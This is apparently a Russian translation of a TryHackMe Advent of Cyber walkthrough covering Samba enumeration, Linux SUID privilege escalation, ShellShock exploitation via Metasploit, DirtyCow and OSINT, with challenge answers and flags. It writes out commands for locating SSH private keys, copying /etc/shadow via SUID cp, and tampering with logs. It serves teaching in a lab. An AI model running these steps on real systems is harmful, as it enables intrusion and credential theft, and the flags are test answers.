поместить <имя файла>	Загрузить файл из общего доступа


Теперь вы можете перейти к ответу на вопрос №3 и вопрос №4.

10.6. Заключение, куда двигаться дальше и дополнительный материал:

Вы изучили основы того, как работает очень распространенный протокол, используемый вычислительными устройствами, и в 
конечном итоге может быть использован с помощью перечисления и неправильной конфигурации. С учетом сказанного, вы 
можете быть удивлены, узнав, что даже принтеры могут использовать протоколы, лежащие в основе Samba.  Swafox создал 
прекрасную комнату на Printer Hacking 101.

Нет более верного утверждения в пентестинге, что практика делает совершенным. Вы можете не только использовать 
инструменты в этой комнате, почему бы не дать попробовать другим и не применить свои знания в комнате "Kenobi" 
Walkthrough или в комнате "Anonymous" Challenge (CTF)  

### Ответить на вопросы ниже
Вопрос №1  Используя  enum4linux , сколько пользователей находится на сервере Samba ( MACHINE_IP)?
```commandline
3
```
Вопрос №2  Сколько «общих ресурсов» имеется на сервере Samba?
```commandline
4
```
Вопрос №3  Используйте smbclient, чтобы попытаться войти в общие ресурсы на сервере Samba ( MACHINE_IP). Какой общий 
ресурс не требует пароля? 
```commandline
tbfc-santa
```
Вопрос №4  Войдите в этот общий доступ. Какой каталог ElfMcSkidy оставил Санте?
```commandline
jingle-tunes
```
## Задание 16
День 11 - Гном-разбойник: Прелюдия

Вот он — момент, которого ждал Эльф МакИгер. Это последний экзамен курса Nmap, на который он записался во время « 
Дня 8 — Что под рождественской елкой? ». Похоже, вся эта тяжелая работа по чтению книг окупилась... «Успех!» — 
кричит Эльф МакИгер... «Эксплойт сработал! Ура!»  

Elf McEager успешно сумел создать обратный шелл от цели обратно к своему компьютеру. Он и не подозревал, что 
настоящий экзамен начинается сейчас... Последний этап экзамена требует от Elf McEager повышения привилегий! Он 
потратил так много времени на изучение шпаргалок Nmap, что теперь у него ничего не получается... Можете ли вы помочь Elf McEager?  

Чтобы быть хорошим парнем, иногда сначала нужно побыть плохим парнем...

Посмотрите видео DarkStar о решении этой задачи

### 11.1 Начало работы:
Прежде чем начать, нам нужно будет развернуть два экземпляра:
- THM AttackBox можно запустить, нажав кнопку « Запустить AttackBox » в правом верхнем углу страницы.
- Уязвимый экземпляр прикрепляется к этой задаче нажатием кнопки « Развернуть » в правом верхнем углу этой задачи/дня.
### 11.2 Цели обучения на сегодня:
Мы собираемся изучить основы повышения привилегий, что это влечет за собой и как это используется изо дня в день, 
даже если вы этого не осознаете в законных обстоятельствах. После изучения основ разрешений файлов Linux и понимания 
того, почему мы можем захотеть повысить наши привилегии как пентестер, мы собираемся применить нашу теорию на 
практике, злоупотребляя распространенной неправильной конфигурацией разрешений файлов в Linux.

Сделано с ❤ от  CMNatic

### 11.3 Что такое повышение привилегий?
Вы можете удивиться, узнав, что повышение привилегий — это то, что вы делаете ежедневно. В вычислительных системах 
существует общее правило, которое определяет, как кто-то взаимодействует с компьютерной системой и ресурсами в ней. 
Существует два основных уровня разрешений, которые человек может иметь для компьютерной системы:  

Пользователь Администратор
Как правило, только администраторы могут изменять системные настройки или изменять разрешения других пользователей 
на доступ к таким ресурсам, как файлы и папки. 

Пользователи могут быть дополнительно разделены по ролям, например, внутри компании. Сотрудники отдела кадров могут 
получать доступ только к кадровым документам, тогда как сотрудники бухгалтерии могут получать доступ только к 
бухгалтерским ресурсам.  

Повышение привилегий — это  просто  процесс повышения текущих привилегий до разрешений, которые у нас есть выше. На 
снимке экрана ниже мы повышаем наши привилегии до администратора для запуска командной строки в Windows 10: 

#### Обычный процесс повышения привилегий
Как пентестер, мы часто хотим повысить свои привилегии до привилегий другого пользователя или администратора, чтобы 
иметь полный доступ к системе. Мы можем обнаружить и злоупотребить неправильными конфигурациями или ошибками в 
системе, чтобы повысить эти привилегии, когда это не должно быть возможным в противном случае.  


### 11.4 Направления эскалации привилегий
Процесс повышения привилегий не так очевиден, как переход от пользователя к администратору в большинстве случаев. 
Скорее, мы медленно пробираемся через ресурсы и функции, с которыми могут взаимодействовать другие пользователи. 


### 11.4.1 Горизонтальное повышение привилегий:
Атака с горизонтальным повышением привилегий подразумевает использование предполагаемых разрешений пользователя для 
злоупотребления уязвимостью с целью доступа к ресурсам другого пользователя, имеющего такие же разрешения, как у вас.
Например, использование учетной записи с доступом к бухгалтерским документам для доступа к учетной записи HR для 
извлечения HR-документов. Поскольку разница в разрешениях учетных записей Accounting и HR заключается в данных, к 
которым они могут получить доступ, вы не повышаете свои привилегии.    


### 11.4.2 Вертикальное повышение привилегий:
Немного более традиционная атака с вертикальным повышением привилегий подразумевает использование уязвимости, 
которая позволяет вам выполнять такие действия, как команды или доступ к данным, действуя от имени учетной записи с 
более высокими привилегиями, например администратора.  

Помните атаку, которую вы провели в " День 1 - Рождественский кризис "? Вы изменили свой cookie-файл, чтобы получить 
доступ к панели управления Санты. Это фантастический пример вертикального повышения привилегий, поскольку вы смогли 
использовать свою учетную запись пользователя для доступа и управления панелью управления. Эта панель управления 
доступна только Санте (администратору), поэтому вы в этом смысле повышаете свои разрешения.    


### 11.5 Укрепление прорыва
Распространенной проблемой, с которой вы столкнетесь при агрессивном пентестинге, является нестабильность. Сама 
природа некоторых эксплойтов зависит от большой руки удачи и терпения для работы. Возьмем, к примеру, эксплойт 
Eternalblue, который создает ряд уязвимостей в том, как ОС Windows выделяет и управляет памятью. Поскольку эксплойт 
записывает данные в память ненадлежащим образом, существует вероятность сбоя компьютера. Мы продемонстрируем способ 
стабилизации нашего соединения в разделе ниже.     

Давайте воспользуемся локальной копией DVWA  (Damn Vulnerable Web App)  и используем уязвимость, называемую 
инъекцией команд, чтобы создать обратное подключение к нашему устройству. Выделенная красным системная команда для 
использования Netcat для обратного подключения к нашей атакующей машине:  



Проверив успешность обратного соединения, мы выполняем две начальные команды, чтобы получить некоторое представление 
о том, как нам следует двигаться дальше: 



Выполнение  whoami команды позволяет нам увидеть имя учетной записи, под которой мы выполняем команды.  echo $0 
сообщает нам о нашей оболочке - в настоящее время это  /bin/sh. Это простая оболочка по сравнению с " /bin/bash ". В 
оболочках, таких как наш текущий Netcat, у нас нет многих удобств, таких как автодополнение по табуляции и повторный 
выбор последней выполненной команды (с помощью стрелки вверх), но, что важно, мы не можем использовать команды, 
которые запрашивают дополнительный ввод, т. е. предоставление учетных данных SSH или использование команды замены 
пользователя su     

Современные установки Ubuntu поставляются с установленным python3, мы можем создать еще одну оболочку и начать 
делать ее интерактивной: 
`python -c 'import pty; pty.spawn("/bin/bash")'`


Есть  много способов сделать оболочку интерактивной,  если Python не установлен.


### 11.6 Вы думали, что перечисление остановилось на Nmap ?
Неправильно! Мы только начали. Получив начальный доступ, важно начать составлять картину внутренностей машины. Мы 
можем искать множество информации, например, другие запущенные службы, конфиденциальные данные, включая пароли, 
исполняемые скрипты двоичных файлов для злоупотребления и многое другое!  

Например, мы можем использовать команду find для поиска общих папок или файлов, которые, как мы подозреваем, 
находятся на компьютере: 
- резервные копии
- пароль
- админ
- конфигурация
Наша уязвимая машина в этом примере имеет каталог под названием backups, содержащий ключ SSH, который мы можем 
  использовать для аутентификации. Это было найдено через:  `find / -name id_rsa 2> /dev/null`....Давайте разберем это: 

Мы используем  find для поиска по тому, указывая корень ( /) для поиска файлов с именем « id_rsa », которое является 
именем  закрытых  ключей SSH, а затем используем , ` 2> /dev/null` чтобы показывать нам только совпадения. 
Можете ли вы назвать какие-либо другие файлы или папки, которые нам может понадобиться  найти ?


### 11.7. «Контрольный список Priv Esc»
По мере продвижения по вашему пути пентестинга вы начнете подбирать определенный рабочий процесс для того, как вы 
подходите к определенным этапам взаимодействия. Хотя этот рабочий процесс действительно ваш, он будет вращаться 
вокруг некоторых фундаментальных шагов в поиске уязвимостей для повышения привилегий.  

Определение ядра машины (эксплуатация ядра, например Dirtyc0w)
Поиск других запущенных служб или установленных приложений, которые могут быть использованы не по назначению (SUID и 
устаревшее программное обеспечение) 
Поиск автоматизированных скриптов, таких как скрипты резервного копирования (использующие crontab)
Учетные данные (учетные записи пользователей, файлы конфигурации приложений...)
Неправильно настроенные разрешения для файлов и каталогов
Ознакомьтесь с некоторыми контрольными списками, которые можно использовать в качестве шпаргалки на этапе 
перечисления при повышении привилегий: 
- g0tmi1k
- пайату
- Полезная нагрузкаAllTheThings
### 11.8 Уязвимость: SUID 101
В сегодняшнем материале мы продемонстрируем ресурс GTFOBins  и  объясним, как неправильно настроенные разрешения 
приложений могут быть использованы для повышения наших привилегий до уровня администратора. 

Во-первых, возникает вопрос... что такое SUID? Что ж, давайте перейдем к той же теме, подробно описав, как именно 
работают разрешения в Linux. Преимуществом Linux является его детализация в разрешениях файлов - однако, они 
довольно пугающие, чтобы приблизиться к ним. При выполнении команд, таких как  ls -l перечисление разрешений нашего 
текущего каталога:   

```commandline
   [A]         [B]     [C]
drwxrwxr-x 2 cmnatic cmnatic 4096 Dec 8 18:33 exampledir
drwxrwxr-x 2 cmnatic cmnatic 4096 Dec 8 18:33 exampledir2
drwxrwxr-x 2 cmnatic cmnatic 4096 Dec 8 18:33 exampledir3
-rw-rw-r-- 1 cmnatic cmnatic 0 Dec 8 18:33 examplefile
-rw-rw-r-- 1 cmnatic cmnatic 0 Dec 8 18:33 examplefile2
-rw-rw-r-- 1 cmnatic cmnatic 0 Dec 8 18:33 examplefile3
```


В нашем каталоге есть три каталога " exampledir [3]" и три файла " examplefile [3]". Я перечислил четыре 
интересующих нас столбца здесь: 

Письмо столбца	Описание	Пример
[А]	filetype ( d каталог  - — файл) и разрешения пользователя и группы « r » для чтения, « w » для записи и « x » 
для выполнения. 
Файл с  `-rw-rw-r--` доступом на чтение/запись доступен только пользователю и группе. Однако, любой другой 
пользователь имеет доступ только на чтение 
[Б]
пользователь, которому принадлежит файл
cmnatic (пользователь системы)
[С]
группа (пользователей), которой принадлежит файл
группа sudoers

На данный момент "examplefiles" не являются исполняемыми, поскольку нет " x " ни для пользователя, ни для группы. 
При установке разрешения на исполнение ( chmod +x filename) это значение изменяется (обратите внимание на " x " в фрагменте ниже -rw x rw x r): 

`-rwxrwxr-x 1 cmnatic cmnatic 0 Dec 8 18:43 backup.sh `
Обычно исполняемые файлы и команды (команды — это просто ярлыки для исполняемых файлов) будут выполняться от имени 
пользователя, который их запустил (при условии, что у них есть разрешения на доступ к файлам для этого). Вот почему 
некоторые команды, такие как изменение пароля пользователя, требуют sudoперед собой. Позволяет  sudo вам выполнять 
что-либо с разрешениями root (наиболее привилегированный пользователь). Пользователи, которые могут использовать,  
sudo называются  «sudoers»  и перечислены в  /etc/sudoers (мы можем использовать это, чтобы помочь идентифицировать 
ценных для нас пользователей).     

SUID — это просто разрешение, добавленное к исполняемому файлу, которое делает то же самое, что и sudo. Однако 
вместо этого позволяет пользователям запускать исполняемый файл от имени того, кто им владеет, как показано ниже: 

Внезапно с введением SUID пользователям больше не нужно быть sudoer, чтобы запустить исполняемый файл как root. Это 
может быть законно использовано для разрешения приложениям, имеющим определенные привилегии для запуска, которые не 
могут быть у другого пользователя.  


### 11.9 Злоупотребление SUID (GTFOBins)
Теперь, когда мы понимаем, почему исполняемые файлы с этим разрешением SUID так заманчивы, давайте начнем изучать, 
как их находить и понимать возможности, которые мы можем сделать с некоторыми из этих исполняемых файлов. На 
поверхности SUID не является изначально небезопасным. Это только когда вы учитываете неправильную настройку 
разрешений (а учитывая сложность Linux - это очень легко сделать); Администраторы не придерживаются правила 
наименьших привилегий при устранении неполадок.    

Исполняемые файлы, способные взаимодействовать с операционной системой, например, читать/писать файлы или создавать 
оболочки, являются для нас золотыми жилами. К счастью, GTFOBins — это веб-сайт, на котором перечислено 
большинство приложений, которые выполняют такие действия для нас. Давайте установим SUID для cp команды, которая 
используется для копирования файлов с помощью chmod u+s /usr/bin/cp   



Обратите внимание, что  cp исполняемый файл принадлежит пользователю «root» и теперь имеет установленные разрешения 
SUID: 
```commandline
cmnatic@docker-ubuntu-s-1vcpu-1gb-lon1-01:~$ ls -al /usr/bin | grep "cp"
-rwsr-xr-x 1 root root 153976 Sep 5 2019 cp
```
Команда cp теперь будет выполняться как root - это значит, что мы можем копировать любой файл в системе. Некоторые 
места могут быть нам интересны: 
- копирование содержимого других пользовательских каталогов (например, истории bash, ключей ssh, user.txt)
- копирование содержимого каталога " /root " (т.е.  "/root/flag.txt" )
- скопируйте файлы " /etc/passwd " и " /etc/shadow " для взлома пароля
Давайте убедимся в этом, выполнив поиск исполняемых файлов с установленным разрешением SUID на компьютере с помощью 
  find: `find / -perm -u=s -type f 2>/dev/null` 

А теперь используем  cp для копирования содержимого  "/root"  в наш каталог (" /home/cmnatic "):

### 11.10 Знакомимся со скриптами перечисления (делают за нас всю работу...)
К счастью для нас, существует множество скриптов перечисления, которые можно использовать для автоматизации 
некоторых процессов перечисления. Мы можем загрузить их на свою собственную машину и использовать несколько методов 
для загрузки их на наш уязвимый целевой экземпляр. Имейте в виду, что уязвимые целевые экземпляры, которые вы 
развертываете на TryHackMe, не имеют доступа в Интернет, поэтому мы должны использовать нашу собственную атакующую 
машину, подключенную к сети THM .    

Великолепный скрипт, который необходим любому человеку, — это «LinEnum», который можно загрузить здесь. LinEnum  
перечисляет  целевую машину для нас, детализируя и собирая полезную информацию, такую как версии ядра, разрешения 
для любых исполняемых файлов или файлов, которые находятся за пределами домашнего каталога пользователя, — и многое 
другое!   

В чем проблема? Легко потеряться во всем этом. Скрипты перечисления часто возвращают много информации, которая часто 
не так уж и полезна для нас; важно понимать, как работают эти скрипты перечисления, чтобы не полагаться на них. 
Однако эти скрипты делают повышение привилегий гораздо более доступным для новичков.  

### 11.10.1  Давайте загрузим  скрипт LinEnum  на нашу машину с помощью  wget:


### 11.10.2.  Давайте используем Python3, чтобы превратить нашу машину в веб-сервер для обслуживания скрипта LinEnum.sh 
, который будет загружен на целевую машину. Убедитесь, что вы запускаете эту команду в том же каталоге, куда вы 
загрузили  LinEnum.sh  : python3 -m http.server 8080  


### 11.10.3.  Нам нужно загрузить это на уязвимый экземпляр (MACHINE_IP), убедившись, что наше собственное устройство 
подключено к сети THM. Есть много способов сделать это, которые будут зависеть от уязвимого экземпляра, который вы атакуете; уязвимый экземпляр может не иметь таких инструментов, как  wget, поэтому нужно будет использовать альтернативы.

### 11.10.3.1.  Перейдите в каталог, в который у нас будет разрешение на запись. Каталог  /tmp позволяет всем 
пользователям писать в него — поэтому мы воспользуемся этим. 

### 11.10.3.2.  Использование  wget на уязвимом экземпляре:

### 11.10.3.3.Использование  : netcat

### 11.10.3.3.1.  Настройте netcat на уязвимом экземпляре для прослушивания входящего файла: nc -l -p 1337 > LinEnum.sh


### 11.10.3.3.2.  Настраиваем netcat на нашей машине для отправки файла: nc -w -3 MACHINE_IP 1337 < LinEnum.sh

### 11.10.3.4.  Добавьте разрешение на выполнение в  LinEnum.sh  на уязвимом экземпляре : chmod +x LinEnum.sh

### 11.10.3.5.  Выполнить  LinEnum.sh  на уязвимом экземпляре: ./LinEnum.sh


### 11.11 Заметая следы
Заключительные этапы тестирования на проникновение включают в себя настройку устойчивости и заметание следов. В 
сегодняшнем материале мы подробно рассмотрим последнее, поскольку об этом упоминается недостаточно. 

Во время пентестинга вам следует попытаться избежать обнаружения администраторами и инженерами вашего клиента в 
пределах разрешенной области пентестинга. Такие действия, как вход в систему, аутентификация и загрузка/выгрузка 
файлов, регистрируются службами и самой системой.  

В Debian и Ubuntu большинство из них остаются в каталоге ` /var/log`  и часто требуют прав администратора для чтения 
и изменения. Некоторые файлы журналов, представляющие интерес: 

` /var/log/auth.log ` (Попытки входа по SSH , а также изменения или вход в систему как системные пользователи:)


` /var/log/syslog ` (системные события, такие как оповещения брандмауэра:)


` /var/log/<service/`
Например, журналы доступа apache2
`/var/log/apache2/access.log"`

### 11.12 Вызов
Убедитесь, что вы развернули экземпляр, прикрепленный к этой задаче, и запишите IP-адрес (MACHINE_IP). Ответьте на 
вопросы № 1 и № 2, прежде чем приступать к входу в уязвимый экземпляр. Вам уже были предоставлены учетные данные для 
входа в уязвимый экземпляр в вопросе № 3.  

Применяйте свои новые знания, полученные в ходе выполнения этого задания, чтобы повысить свои привилегии! При 
необходимости внимательно изучите подсказки — все, что нужно для завершения этого дня, обсуждалось в ходе выполнения 
сегодняшнего задания.  

Хотите отточить свои навыки? Я настоятельно рекомендую ознакомиться с новым модулем " Повышение привилегий и 
оболочки " на TryHackMe. Модули предоставляют пошаговый стиль обучения для всех пользователей, аналогично подписчику 
Pathways .   

Ответить на вопросы ниже
Какой тип повышения привилегий подразумевает использование учетной записи пользователя для выполнения команд в 
качестве администратора? 

Vertical

### Правильный ответ
Как называется файл, содержащий список пользователей, входящих в группу sudo?


```commandline
sudoers
```
Используйте SSH для входа на уязвимую машину следующим образом:ssh cmnatic@MACHINE_IP


```commandline
При появлении запроса введите следующий пароль: aoc2020
```
Перечислите машину для исполняемых файлов, которые имели установленное разрешение SUID. Посмотрите на вывод и 
используйте смесь GTFObins и своих исследовательских навыков, чтобы узнать, как эксплуатировать этот двоичный код. 

Возможно, вам будет полезно загрузить некоторые скрипты перечисления, которые использовались во время сегодняшнего 
задания. 
```commandline
Ответ не нужен
```
Используйте этот исполняемый файл для запуска системной оболочки как root.

Каково содержимое файла, расположенного в `/root/flag.txt` ?
```commandline
thm{2fb10afe933296592}
```

## Задание 17
День 12: На старт, внимание, эльф. - Прелюдия:

Рождество быстро приближается, но все молчат в The Best Festival Company (TBFC). Что происходит?! Наглость этих 
эльфов - бездельничать в праздничный период! У Санты нет времени на бездельников в его мастерской. В конце концов, 
сани сами себя не наполнят, и списки хороших и плохих не будут отсортированы. Санта поручил вам, Эльф МакИгер, 
вернуть этих эльфов в строй.   

Посмотрите видео DarkStar о решении этой задачи!

### 12.1 Начало работы:
Прежде чем начать, нам нужно будет развернуть два экземпляра:

THM AttackBox, нажав кнопку " Кнопка « Запустить AttackBox » в правом верхнем углу страницы.
 Уязвимый экземпляр, прикрепленный к этой задаче путем нажатия кнопки « Развернуть » в правом верхнем углу этой задачи/дня.
### 12.2 Цели обучения на сегодня:

Мы собираемся применить некоторые навыки и методы, которые мы ранее исследовали в Advent of Cyber ​​этого года. 
Давайте наденем наши  колпачки для перечисления, похрустим костяшками пальцев и займемся изучением, открытием и 
эксплуатацией интересной функциональности веб-серверов.  
Сделано с ❤ от  CMNatic

### 12.3. Уязвимость... раскройте себя!
По мере того, как продолжается жизненный цикл приложения, продолжается и его нумерация версий. Приложения содержат, 
казалось бы, невинные отличительные признаки информации, такие как нумерация версий. Известные как раскрытие 
информации, эти крупицы информации передаются нам сервером через сообщения об ошибках, такие как на следующем снимке 
экрана, заголовки HTTP или даже на самом веб-сайте.   



Злоумышленник может использовать базы знаний, такие как Rapid7 , AttackerKB , MITRE или Exploit-DB, для поиска 
уязвимостей, связанных с номером версии этого приложения. Уязвимости атрибутируются номером CVE. Вы можете узнать 
больше об этом в комнате MuirlandOracle Intro to Research .  



### 12.4. Все CGI (И нет, не киношное...)
Как вы могли обнаружить в ходе "веб"-части мероприятия, веб-серверы не просто отображают веб-сайты... Они способны 
напрямую взаимодействовать с операционной системой.  Common Gateway Interface или сокращенно CGI — это стандартное 
средство связи и обработки данных между клиентом, например веб-браузером, и веб-сервером.  

Проще говоря, эта технология упрощает взаимодействие с программами, такими как файлы скриптов Python, приложения C++ 
и Java, а также системные команды, и все это в браузере — как если бы вы выполняли их в командной строке. 


( Америка Онлайн., 1999 )

Несмотря на свой возраст, скрипты CGI по-прежнему используются в таких устройствах, как встроенные компьютеры, 
устройства Интернета вещей, маршрутизаторы и т. п., которые не могут запускать сложные фреймворки, такие как PHP или 
Node.  



### 12.5. Суть
в том, что CGI имеет правильные намерения и варианты использования, но эта технология может быстро стать объектом 
злоупотреблений со стороны таких людей, как мы!  Обычно скрипты CGI хранятся в  папке /cgi-bin/  на веб-сервере. 
Возьмем, к примеру, этот  файл systeminfo.sh  , который отображает дату, время и пользователя, под которым запущен 
веб-сервер:   



При переходе к местоположению этого скрипта с помощью нашего браузера, скрипт выполняется на веб-сервере, а 
полученный результат отображается нам. Как мы можем это использовать? 


### 12.6. Как мы продемонстрировали... 
Мы могли бы, возможно, разобрать наши собственные команды до этого скрипта, который будет выполнен. Поскольку мы 
знаем, что это машина Ubuntu, мы можем попробовать некоторые команды  Linux,ls например,  для вывода списка 
содержимого рабочего каталога:  


Или на компьютере с Windows эта  systeminfo команда выдает некоторую полезную информацию:



Это достигается путем анализа команды как аргумента с помощью ?& ie ?&ls . Поскольку это веб-сервер, любые пробелы 
или специальные символы должны быть закодированы в URL . 

### 12.7. Для этого есть инструменты! Практический Metasploit
Теперь, когда мы понимаем, какое приложение запущено, такие инструменты, как Metasploit, можно использовать для 
подтверждения подозрений и, надеюсь, их использования! После некоторых независимых исследований, это приложение 
уязвимо для атаки ShellShock ( CVE 2014-6271 )  

Давайте запустим консоль Metasploit и воспользуемся полезной нагрузкой ShellShock. ( Здесь будет полезна комната 
TryHackMe и запись в блоге о Metasploit ) 

Как минимум, при использовании эксплойта Metasploit должен знать две вещи:

Ваша машина (например, TryHackMe AttackBox), с которой вы проводите атаку ( LHOST )
Цель, которую вы атакуете ( RHOST(S) )
Эксплойты будут иметь свои собственные индивидуальные настройки, которые вам нужно будет настроить. Мы можем 
перечислить их, используя команду options, а затем использовать set OPTION VALUE соответственно. В нашем примере 
эксплойт  включает в себя скрипты CGI, и поэтому мы должны указать местоположение скрипта на веб-сервере, который мы 
атакуем. В примере до сих пор это было по адресу  http://10.0.0.1/cgi-bin/systeminfo.sh   

Для того чтобы атака, использованная в качестве примера в этой задаче, сработала, параметры должны быть установлены 
следующим образом: 
```commandline
LHOST - 10.0.0.10 (наш ПК)
RHOST - 10.0.0.1 (удаленный ПК)
TARGETURI /cgi-bin/systeminfo.sh (местоположение скрипта)
```


Обратите внимание, что эти параметры предназначены для эксплойта, используемого в качестве примера, вам придется 
установить эти значения соответствующим образом для данной задачи. 

Убедившись, что все параметры set верны, давайте запустим эксплойт, чтобы получить соединение Meterpreter ... Успех!



Для запуска системных команд на хосте мы будем использовать shell. Создав оболочку на удаленном хосте, мы можем 
запускать системные команды, как если бы это был наш собственный ПК. 



Я настоятельно рекомендую комнату RP: Metasploit , если вы хотите глубже изучить этот замечательный фреймворк. 

### 12.8. Пришло время испытаний
Чтобы решить проблему эльфа Макскиди с бездельничающими в мастерской эльфами, он создал CGI-скрипт: elfwhacker.bat

Разверните экземпляр, прикрепленный к этой задаче , используйте свои навыки NMAP из « Дня 8 - Что под рождественской 
елкой?»,   чтобы узнать, MACHINE_IPна каком порту работает веб-сервер... Посетите приложение и узнайте версию 
установки, используйте эту информацию в качестве оружия, выполнив поиск в базах знаний на предмет эксплойтов и 
возможных полезных нагрузок Meterpreter , и уничтожьте этих эльфов!   


Поскольку это компьютер с ОС Windows, подождите не менее пяти минут, прежде чем начинать перечисление.



Бонус: есть как минимум два способа повысить свои привилегии после того, как вы получите доступ. Узнайте их и 
меняйте в свое удовольствие! (обратите внимание, что это необязательно в этот день, если вы хотите испытать себя...) 

### 12.9 Куда идти дальше

DarkStar7471's AttackerKB Room

Комната MITRE от Heavenraiza

RP DarkStar7471: Комната Metasploit

### Ответить на вопросы ниже
Каков номер версии веб-сервера?

```commandline
9.0.17
```
Какой CVE можно использовать для создания записи Meterpreter на машине? (Формат: CVE-XXXX-XXXX)

```commandline
CVE-2019-0232
```
Настройте параметры Metasploit соответствующим образом и закрепитесь на развернутой машине.
```commandline
Ответ не нужен
```
Каково содержимое flag1.txt?

```commandline
thm{whacking_all_the_elves}
```
Хотите челленджа? Попробуйте найти некоторые уязвимости, чтобы повысить свои привилегии!
```commandline
Ответ не нужен
```

## Задание 18
День 13: Уголь на Рождество
Докажите, что эти системные администраторы заслуживают угля на Рождество!

Посмотрите видео Джона Хаммонда о решении этой задачи!
### Ответить на вопросы ниже
Привет, Санта, прыгай в сани и запускай эту машину!
```commandline
Ответ не нужен
```
Рождественский GPS теперь показывает, что этот дом находится по адресу MACHINE_IP. Просканируйте эту машину с 
помощью инструмента сканирования портов по вашему выбору. 

Сканирование портов

Начнем со сканирования машины. Если вы работаете с TryHackMe "Attackbox" или с экземпляра Kali Linux (или, честно 
говоря, с любого дистрибутива Linux, где это установлено), вы можете использовать nmap с таким синтаксисом: 


nmap MACHINE_IP
```commandline
Ответ не нужен
```
Какой старый, устаревший протокол и служба работают?


```commandline
telnet
```
Первоначальный доступ

Подключитесь к этой службе, чтобы посмотреть, сможете ли вы ее использовать. Вы можете подключиться к службе с 
помощью стандартного клиента командной строки, названного по имени службы, или netcat с таким синтаксисом: 

telnet MACHINE_IP <PORT_FROM_NMAP_SCAN>
Какие полномочия вам оставили?


```commandline
clauschristmas
```
Перечисление

Похоже, вы можете спуститься прямо по дымоходу! Войдите в систему и осмотритесь, немного почитайте. Вы можете 
просматривать файлы и папки в текущем каталоге с помощью ls , менять каталоги с помощью cd  и просматривать 
содержимое файлов с помощью cat.  

Часто для перечисления вы хотите посмотреть на соответствующую системную информацию, например, версию операционной 
системы или другую информацию о выпуске. Вы можете просмотреть некоторую информацию с помощью таких команд: 
```commandline
cat /etc/*release
uname -a 
cat /etc/issue 
```

Большой список команд, которые можно запустить для перечисления, можно найти здесь:  https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

Какой дистрибутив Linux и номер версии установлен на этом сервере?


```commandline
Ubuntu 12.04
```
Это очень  старая  версия Linux! Она может быть уязвима к некоторым эксплойтам ядра, которые мы могли бы 
использовать для повышения наших привилегий. 

Посмотрите на печенье и молоко, которые владельцы сервера оставили для вас. Вы можете сделать это с помощью команды 
cat, как упоминалось ранее. 

кот cookies_and_milk.txt

Кто пришел первым?


```commandline
grinch
```
Преступник забрал половину печенья и молока! Как ни странно, этот файл выглядит как код на языке C...

Этот исходный код C является частью эксплойта ядра под названием DirtyCow . Dirty COW (CVE-2016-5195) — уязвимость 
повышения привилегий в ядре Linux, использующая состояние гонки, обнаруженное в способе, которым подсистема памяти 
ядра Linux обрабатывает нарушение копирования при записи (COW) приватных отображений памяти только для чтения. 
Непривилегированный локальный пользователь может использовать эту уязвимость для получения доступа к записи 
отображений памяти только для чтения и, таким образом, повысить свои привилегии в системе.    

Дополнительную информацию об уязвимости DirtyCow можно найти здесь:  https://dirtycow.ninja/

Этот файл cookies_and_milk.txt  выглядит как измененная версия эксплойта DirtyCow, обычно написанного на языке C. 
Найдите копию этого оригинального файла в сети и загрузите ее на целевой ящик. Вы можете сделать это с помощью 
некоторых простых методов передачи файлов, таких как netcat, или развернув быстрый HTTP-сервер Python... или вы 
можете просто скопировать и вставить его в текстовый редактор на ящике!   
```commandline
Ответ не нужен
```
Вы можете скомпилировать исходный код C на целевой платформе с помощью gcc . Вам может потребоваться указать 
определенные параметры или аргументы для включения различных библиотек, но, к счастью, исходный код DirtyCow объяснит, какой синтаксис использовать. 

Какой дословный синтаксис можно использовать для компиляции, взятый из реальных комментариев к исходному коду на 
языке C? 


```commandline
gcc -pthread dirty.c -o dirty -lcrypt
```
Повышение привилегий

Выполните команды для компиляции эксплойта и запустите его.

Какое «новое» имя пользователя было создано с использованием стандартных операций настоящего исходного кода C?


```commandline
firefart
```
Переключите своего пользователя на эту новую учетную запись и перейдите в каталог /root, чтобы стать владельцем 
этого сервера! 

Вы можете переключать учетные записи пользователей следующим образом:

su <пользователь_для_изменения_на>
```commandline
Ответ не нужен
```
Ой-ой, похоже, этот преступник оставил сообщение! Следуйте его инструкциям, чтобы доказать, что вы действительно 
оставили Коул на Рождество! 

После того, как вы оставите уголь, вы можете запустить дерево | md5sum

Каков выходной хэш MD5?


```commandline
8b16f00dd3b51efadb02c1df7f8427cc
```

## Задание 19
День 14: Где Рудольф?:

Это была ночь перед Рождеством, и Рудольф потерялся.
Теперь Санта должен найти его любой ценой.
Вас наняли, чтобы вернуть Рудольфа.
Как ваши навыки OSINT? Идите по следам Рудольфа...


### Задание 1

Во время охоты и поиска любых подсказок или зацепок
Санта раскрывает некоторые подробности и делится новостями
Рудольф любил пользоваться Reddit и много просматривал
Его имя пользователя было «IGuidetheClaus2020».

Многие расследования OSINT начинаются только с имени пользователя. История сообщений пользователя может привести к 
дополнительной информации. Иногда нам помогают самые незначительные подсказки. Просмотрите историю Reddit Рудольфа и 
ответьте на вопросы № 1–5 ниже. Возможно, вам придется использовать частичные подсказки с поисковой системой, чтобы 
заполнить пробелы.   

Посмотрите видео TheCyberMentor о решении этой задачи!

### Цели обучения:

1) Определите важную информацию на основе истории публикаций пользователя.
2) Используйте внешние ресурсы, такие как поисковые системы, для поиска дополнительной информации, такой как полные 
   имена и дополнительные аккаунты в социальных сетях. 

Дополнительные ресурсы:

Хотя истории публикаций Рудольфа достаточно, чтобы определить, что у него есть другие аккаунты в социальных сетях, 
иногда нам не так везет. Существуют замечательные инструменты, которые позволяют нам искать аккаунты пользователей 
на платформах социальных сетей. Такие сайты, как https://namechk.com/ , https://whatsmyname.app/ и 
https://namecheckup.com/быстро определит другие возможные учетные записи для нас. Такие инструменты, как 
https://github.com/WebBreacher/WhatsMyName и https://github.com/sherlock-project/sherlock , тоже это делают. Просто 
введите имя пользователя, нажмите «поиск» и просмотрите результаты. Это так просто!     


### Задание №2

Ну, похоже, вы обнаружили Twitter Рудольфа.
Теперь мы можем читать всю его болтовню
Просмотрите его профиль и дайте ему несколько просмотров.
Чем глубже вы копаете, тем лучше подсказки

Найдя другой аккаунт, принадлежащий нашему пользователю, мы открываем возможность сбора еще большей информации. 
Используйте информацию, найденную в аккаунте Рудольфа в Twitter, чтобы ответить на вопросы № 6-11. 

### Цели обучения:

1) Определите важную информацию на основе истории публикаций пользователя.
2) Используйте обратный поиск изображений, чтобы определить, где была сделана фотография, и, возможно, найти дополнительную информацию, например, другие учетные записи пользователей.
